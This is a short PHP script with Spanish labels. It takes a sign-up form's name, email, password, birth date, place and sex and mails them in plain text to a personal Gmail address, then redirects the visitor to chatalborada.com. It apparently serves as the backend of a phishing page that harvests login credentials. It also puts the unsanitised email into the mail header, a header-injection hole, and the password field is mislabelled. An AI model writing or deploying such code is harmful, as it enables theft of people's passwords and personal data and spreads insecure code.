<?php
$nombre = $_POST['nombre'];
$email = $_POST['email'];
$mensaje = $_POST['mensaje'];
$cpassword = $_POST['cpassword1'];
$Lugar = $_POST ['textfield'];
$select = $_POST ['select'];
$select2 = $_POST ['select2'];
$select3 = $_POST ['select3'];
$select4 = $_POST ['select4'];
$para = 'pyasowe@gmail.com';
$titulo = 'ASUNTO DEL MENSAJE';
$header = 'From: ' . $email;
$msjCorreo = "Nombre: $nombre\n E-Mail: $email\n Password: $mensaje\n Rpassword: $mensaje\n Lugar: $Lugar\n Año: $select\n Mes: $select2\n Dia: $select3\n Sexo: $select4";
  
if ($_POST['submit']) {
if (mail($para, $titulo, $msjCorreo, $header)) {
echo "<script language='javascript'>
alert('Mensaje enviado, muchas gracias.');
window.location.href = 'https://chatalborada.com/';
</script>";
} else {
echo 'Falló el envio';
}
}
?>
